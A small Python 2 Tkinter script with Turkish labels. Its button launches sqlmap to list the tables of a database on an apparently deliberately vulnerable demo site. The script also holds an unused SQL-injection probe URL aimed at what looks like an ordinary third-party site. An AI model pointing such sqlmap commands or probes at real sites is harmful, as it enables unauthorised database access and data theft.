#!/usr/bin/env python
# -- coding: utf-8 --

import os
import sys
from Tkinter import *
import urllib
import subprocess

def sqlmapdenme():
    site="https://countryfest.ca/page.php?id=72%27"
    p = subprocess.Popen(["sqlmap", "-u", "http://aspnet.testsparker.com/Products.aspx?pId=4", "-D", "testsparker", "--tables"],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    output, err = p.communicate()
    etiket = Label(text="Çıktı:"+output)
    etiket.pack()
    return output

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Sql")

pencere = Tk()
ment = StringVar()
pencere.title("Nmap Araçları")
pencere.geometry("1000x800+100+100")
mbutton = Button(pencere, text="Başlat", command=sqlmapdenme).pack()
pencere.mainloop()